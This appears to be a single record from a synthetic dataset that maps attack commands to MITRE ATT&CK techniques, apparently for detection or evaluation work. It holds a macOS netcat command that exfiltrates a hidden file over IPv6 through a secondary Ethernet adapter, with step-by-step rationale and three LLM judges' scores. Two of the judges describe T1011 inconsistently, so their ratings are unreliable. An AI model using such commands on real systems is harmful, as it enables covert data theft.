@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
+  "explanation": "Forces exfiltration over a non-primary, often dormant USB/Thunderbolt Ethernet adapter (en5) via IPv6 TCP on an uncommon port, consistent with T1011 by using an alternate physical medium.",
+  "rationale_steps": [
+    "Use ipconfig to fetch the IPv6 address of the auxiliary Ethernet interface en5.",
+    "Bind netcat's source to en5's address to avoid the primary network path.",
+    "Exfiltrate data over IPv6 TCP to a link-local peer on a high-numbered port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-3cfd2e08",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat, correct use of command substitution, and appropriate input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over IPv6 using netcat on a specific interface (likely a secondary network adapter) as claimed, though the connection to T1011 (Exfiltration Over Other Network Medium) is strong but the technique number referenced doesn't match the description provided.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:15:25.848926Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, balanced quotes for command substitution and IPv6 scope ID, and correct input redirection.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command is operationally plausible for exfiltration as described, exfiltration of data is fundamentally misaligned with the MITRE ATT&CK T1011 'Establish Accounts' technique, which focuses on account creation or abuse.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T09:15:34.436129Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid macOS/BSD nc flags (-6, -s), proper IPv6 scope notation, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates a file over IPv6 via a specific secondary interface to a link\u2011local listener, but depends on en5 having an IPv6 address and a listening peer, and the provided technique description (Establish Accounts) does not match the behavior.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T09:15:58.050365Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
